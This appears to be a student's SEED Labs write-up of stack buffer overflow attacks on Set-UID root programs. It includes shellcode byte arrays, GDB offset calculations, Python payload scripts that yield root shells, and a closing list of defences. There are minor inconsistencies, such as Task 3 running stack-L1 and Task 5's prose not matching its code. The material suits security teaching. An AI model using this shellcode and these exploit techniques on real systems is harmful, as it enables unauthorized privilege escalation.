---
layout: post
title: "Buffer Overflow Attack"
category: seed-labs
tags: [binary-exploitation, buffer-overflow, shellcode, gdb, stack-smashing]
date: december 5, 2025
---

## Overview

This lab investigates buffer overflow vulnerabilities in Set-UID programs and demonstrates how they can be exploited to gain root privileges. The vulnerable program reads user-controlled input from a file into a fixed-size stack buffer using `strcpy`, which performs no bounds checking. When the input is too large, it overflows the buffer and overwrites adjacent stack data including the saved return address. By crafting a payload that contains shellcode, padding, and a forged return address, we can redirect execution to our shellcode and spawn a root shell.

The lab covers multiple scenarios: 32-bit and 64-bit programs, exploiting with and without a known EBP value, exploiting a small buffer using a variable in main, and testing whether removing `setuid(0)` from the shellcode changes the outcome.

## Environment Setup

- Linux (Ubuntu-based SEED Lab VM)
- GDB with PEDA extension (for inspecting stack layout and computing offsets)
- Python 3 (for writing exploit scripts)
- Set-UID root binaries compiled from C source with stack protection disabled
- Executable stack enabled (`-z execstack`)

The shellcode folder was compiled first, then the vulnerable stack programs:

```bash
# Compile shellcode proof-of-concept binaries
make
# gcc -m32 -z execstack -o a32.out call_shellcode.c
# gcc -z execstack -o a64.out call_shellcode.c

# Make Set-UID root
make setuid
# sudo chown root a32.out a64.out
# sudo chmod 4755 a32.out a64.out
```

Vulnerable stack programs were compiled with multiple buffer sizes:

```bash
make
# gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
# gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
# sudo chown root stack-L1 && sudo chmod 4755 stack-L1
# gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
# gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
# sudo chown root stack-L2 && sudo chmod 4755 stack-L2
# gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
# gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c
# sudo chown root stack-L3 && sudo chmod 4755 stack-L3
# gcc -DBUF_SIZE=10  -z execstack -fno-stack-protector -o stack-L4 stack.c
# gcc -DBUF_SIZE=10  -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c
# sudo chown root stack-L4 && sudo chmod 4755 stack-L4
```

## Attack Methodology

### Task 1 - Shellcode Proof of Concept

The shellcode used throughout this lab is defined as a C byte array. It first calls `setuid(0)` to ensure root privileges, then executes `/bin/sh`:

```c
const char shellcode[] =
#if __x86_64__
    /* setuid(0) */
    "\x48\x31\xff"                    // xor rdi, rdi
    "\x48\x31\xc0"                    // xor rax, rax
    "\xb0\x69"                        // mov al, 0x69  (setuid syscall)
    "\x0f\x05"                        // syscall
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    "\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    /* setuid(0) */
    "\x31\xdb"                        // xor ebx, ebx
    "\x31\xc0"                        // xor eax, eax
    "\xb0\xd5"                        // mov al, 0xd5
    "\xcd\x80"                        // int 0x80  (setuid)
    "\x50\x68\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;
```

The `call_shellcode.c` program uses a function pointer to jump directly into this shellcode. Running it on a Set-UID root binary confirms the shellcode works and spawns a root shell:

```bash
./a32.out
# whoami
# root
./a64.out
# whoami
# root
```

This is a proof of concept showing that once we redirect control flow to our shellcode, we get a root shell.

### Task 2 - Exploiting a 32-bit Vulnerable Program (stack-L1)

The vulnerable program has a `bof()` function that calls `strcpy` into a 100-byte buffer with no bounds check. An oversized input overflows the buffer and overwrites the return address.

First, an empty `badfile` is created for the program to read. Then GDB is used to find the exact offset from the buffer to the saved return address:

```bash
nano badfile
gdb stack-L1-dbg
```

Inside GDB:

```
gdb-peda$ b bof
gdb-peda$ run
gdb-peda$ next
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb58
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcaec
```

Offset calculation:

```bash
python3 -c "print(0xffffcb58 - 0xffffcaec + 4)"
# 112
```

The offset from the start of the buffer to the return address is **112 bytes**. The exploit script places shellcode at byte 300 of the payload, then writes the forged return address at offset 112:

```python
# Put the shellcode somewhere in the payload
start = 300
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it at the offset
buffer = 0xffffcaec
ret    = buffer + start    # points into shellcode
offset = 112

L = 4      # 4 bytes for 32-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
```

Running the exploit:

```bash
python3 exploit.py
./stack-L1
# Input size: 517
# whoami
# root
```

### Task 3 - Attack Without Knowing EBP (stack-L2)

When the exact EBP value is unknown, a spray technique is used. Instead of placing the forged return address at one specific offset, the payload fills a wide range of the stack with the same target address. Regardless of minor stack variations, one of those overwrites lands on the saved return address.

The shellcode is placed near the end of the payload. The return address is sprayed across the entire first 288 bytes of the buffer in 4-byte steps:

```python
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

buffer = 0xffffcaec
ret    = buffer + start

L = 4
for offset in range(0, 288, L):
    content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
```

```bash
python3 exploit.py
./stack-L1
# Input size: 517
# whoami
# root
```

The attack succeeded without knowing EBP.

### Task 4 - 64-bit Program (stack-L3)

For the 64-bit binary, addresses are 8 bytes. GDB is used on `stack-L3-dbg` to find RBP and the buffer address:

```
gdb-peda$ p $rbp
$1 = (void *) 0x7fffffffd990
gdb-peda$ p &buffer
$2 = (char (*)[200]) 0x7fffffffd8c0
```

Offset calculation:

```bash
python3 -c "print(0x7fffffffd990 - 0x7fffffffd8c0 + 8)"
# 216
```

The exploit script is updated with 8-byte addressing:

```bash
python3 exploit.py
./stack-L3
# Input size: 517
# whoami
# root
```

### Task 5 - Small Buffer, Using `str` in Main (stack-L4)

The buffer inside `bof()` is only 10 bytes, too small to hold the shellcode. Instead, the `str` array declared in `main` is used as the shellcode landing zone. GDB on `stack-L4-dbg` gives its address:

```
gdb-peda$ p $str
$1 = (char (*)[517]) 0x7fffffffddc0
```

The exploit script is updated to place shellcode at the start of the payload (which maps to `str` in `main`), with offset 18 and 8-byte addressing:

```python
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

buffer = 0x7fffffffddc0
ret    = buffer + start
offset = 18

L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
```

```bash
python3 exploit.py
./stack-L4
# Input size: 517
# whoami
# root
```

Even with a 10-byte stack buffer, the attack succeeded by targeting `str` in `main`.

### Task 6 - Shellcode Without `setuid(0)`

The shellcode was modified to remove the `setuid(0)` system call. The attack still produced a root shell. This is because the program is already running with root privileges due to the Set-UID bit on the binary, so calling `setuid(0)` inside the shellcode is redundant. The privilege is inherited from the process, not set by the shellcode.

## Key Findings

- `strcpy` with no bounds checking in a Set-UID program is sufficient to gain a root shell.
- GDB is essential for computing the exact offset from the buffer start to the saved return address.
- A return address spray works even without knowing the exact stack layout, at the cost of a slightly larger payload.
- 64-bit exploitation requires 8-byte little-endian addresses and a larger offset.
- When the stack buffer is too small for shellcode, a larger variable elsewhere in the program (like a global or a `main`-local array) can serve as the landing zone.
- The `setuid(0)` call inside shellcode is unnecessary when the target binary already runs as root.

## Defense Implications

- Replace `strcpy` with size-limited functions like `strncpy` or `strlcpy`.
- Compile with stack canaries (`-fstack-protector`) to detect overflow before the function returns.
- Enable ASLR to randomize stack addresses and make return address prediction harder.
- Mark the stack non-executable (NX bit / DEP) to stop injected shellcode from running directly.
- Avoid assigning Set-UID root to programs that handle untrusted input.

## Tools Used

- GDB with PEDA (stack inspection and offset calculation)
- Python 3 (exploit payload generation)
- gcc (compilation with and without stack protection)
- Linux Set-UID mechanism
- Shellcode (32-bit and 64-bit variants with and without setuid syscall)
